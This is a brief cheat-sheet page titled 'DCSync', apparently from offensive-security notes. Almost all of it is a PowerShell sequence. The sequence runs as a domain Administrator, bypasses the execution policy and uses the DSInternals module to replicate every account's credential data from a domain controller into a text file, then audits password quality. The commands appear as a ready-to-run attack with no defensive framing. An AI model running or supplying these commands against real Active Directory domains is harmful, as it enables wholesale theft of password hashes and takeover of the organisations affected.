---
title: DCSync
category: windows
weight: -1
---

```powershell
runas /netonly /U:Example\Administrator cmd.exe
powershell -ep bypass
Import-Module DSInternals
$a = Get-ADReplAccount -All -Server 10.1.1.1 -NamingContext "dc=XXXX,dc=XXXX"
$a | Out-File full.txt -Encoding utf8
$a | Test-ADDBPasswordQuality | Out-File qual.txt -Encoding utf8
```